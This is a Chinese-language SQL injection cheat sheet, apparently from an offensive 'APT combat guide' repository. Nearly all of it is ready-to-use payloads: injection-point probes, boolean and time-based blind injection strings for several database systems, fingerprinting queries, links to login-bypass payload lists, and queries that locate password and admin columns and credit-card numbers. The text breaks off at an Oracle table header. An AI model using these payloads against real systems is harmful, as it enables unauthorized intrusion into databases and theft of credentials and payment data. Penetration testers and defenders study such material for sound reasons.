# SQL注入漏洞

## 1.注入点检测

（1）报错信息

特殊字符：

```bash
'
%27
"
%22
#
%23
;
%3B
)
||
*
--
/* */
&apos;
```

SQL语句：

```bash
'SELECT  //不成对的引号
1' OR '1' = '2  //逻辑错误
'1' = 1 --  //类型错误
'1' AND ASCII('a') = '97 --  //函数错误
'1' OR ('x'='x'  //操作符错误
```
(2)Boolean盲注

盲注检测：

|描述|查询语句|
|----|----|
|逻辑运算|page.php?id=1 or 1=1 -- 返回为true<br>page.php?id=1' or 1=1 -- 返回为true<br>page.php?id=1" or 1=1 -- 返回为true<br>page.php?id=1 and 1=2 -- 返回为false|
|数学运算|page.php?id=1/1 -- 返回为true<br>page.php?id=1/0 -- 返回为false<br>page.php?id=1/abs(1) -- 返回为true<br>page.php?id=1/abf(1) -- 返回为false|

逻辑运算字典：

[sql_logic](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/sqli-logic.txt)

(3)时间盲注

MySQL：

```sql
1' + sleep(5)
1' and sleep(5)
1' && sleep(5)
1' | sleep(5)
```

PostgreSQL:

```sql
1' and pg_sleep(5)
1' || pg_sleep(5)
```

SQL Server:

```sql
1' WAITFOR DELAY '0:0:5'
1' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (SELECT SLEEP(5)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=CHAR(109,97,115,116,101,114)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

Oracle:

```sql
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5)
1' AND DBMS_LOCK.SLEEP(5)
```

SQLite:

```sql
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## 2.DBMS识别

MySQL识别：
|描述|查询语句|
|----|----|
|睡眠|id=1'-SLEEP(1)=0 LIMIT 1 --|
|BENCHMARK|id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --|
|字符串拼接|id=' 'mysql' –<br>'my' 'sql'<br>CONCAT('my','sql')|
|函数|connection_id() --<br>row_count() --<br>POW(1,1) --|
|错误信息|id='|
|默认变量|@@version_compile_os<br>@@version<br>@@basedir<br>@@datadir|
|比较函数|conv('a',16,2)=conv('a',16,2)<br>connection_id()=connection_id()<br>crc32('MySQL')=crc32('MySQL')|

Oracle识别：
|描述|查询语句|
|----|----|
|字符串拼接|id='\|\|'oracle' --|
|函数|BITAND(1,1) –|
|默认表|id='UNION SELECT 1 FROM v$version --|
|错误信息|id='|
|睡眠|dbms_pipe.receive_message(('a'),10)|
|默认变量|SELECT banner FROM v$version<br>SELECT version FROM v$instance|
|比较函数|ROWNUM=ROWNUM<br>RAWTOHEX('AB')=RAWTOHEX('AB')|

SQL Server识别：
|描述|查询语句|
|----|----|
|睡眠|id=';WAITFOR DELAY '00:00:10'; --|
|字符串拼接|id='mssql'+'mssql' --|
|函数|@@rowcount --<br>SQUARE(1) --<br>@@pack_received --|
|默认变量|id=sql'; SELECT @@SERVERNAME --|
|错误信息|id='<br>id=@@SERVERNAME<br>id=0/@@SERVERNAME|
|比较函数|BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)<br>@@CONNECTIONS>0<br>@@CONNECTIONS=@@CONNECTIONS|

PostgreSQL识别：
|描述|查询语句|
|----|----|
|睡眠|SELECT pg_sleep(10)|
|字符串拼接|'foo'\|\|'bar'|
|默认变量|SELECT version()|
|错误信息|1 = (select case when (条件语句) then 1/(select 0) else null end)|
|比较函数|pg_client_encoding()=pg_client_encoding()<br>get_current_ts_config()=get_current_ts_config()<br>quote_literal(42.5)=quote_literal(42.5)<br>current_database()=current_database()|

这里放置一个来自[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)的表：
```sql
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## 3.注入类型

(1)MySQL

[MySQL注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/MySQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B)

(2)Oracle

[Oracle注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/Oracle%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B)

(3)SQL Server

[SQL Server注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/SQL%20Server%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B)

(4)PostgreSQL

[PostgreSQL注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/PostgreSQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B)

(5)BigQuery

[BigQuery注入类型](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/BigQuery%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B)

(6)Cassandra

[Cassandra注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/Cassandra)

(7)DB2

[DB2注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/DB2)

(8)HQL

[HQL注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/HQL)

(9)SQLite

[SQLite注入](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/WEB%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/SQL/SQLite)

## 4.身份验证绕过

Payload:

[login_bypass](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass.txt)<br>
[login_bypass2](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/login_bypass2.txt)<br>

## 5.数据定位

MySQL：
|描述|查询语句|
|----|----|
|数据库大小|SELECT table_schema “数据库名称",sum( data_length + index_length ) / 1024 / 1024 “数据库大小MB",sum( data_free )/ 1024 / 1024 “可用空间MB" FROM information_schema.TABLES GROUP BY table_schema ;|
|关键字数据库|SELECT table_schema “数据库名称" FROM information_schema.TABLES WHERE table_schema LIKE “%passwords%" GROUP BY table_schema ;|
|关键字表名|SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE “information_schema" AND table_name LIKE “%admin%“;|
|关键字列名|SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE “%password%“;|
|正则表达式匹配列值|SELECT * from 表名 WHERE cc_number REGEXP '^4[0-9]{15}$';|

Oracle:
|描述|查询语句|
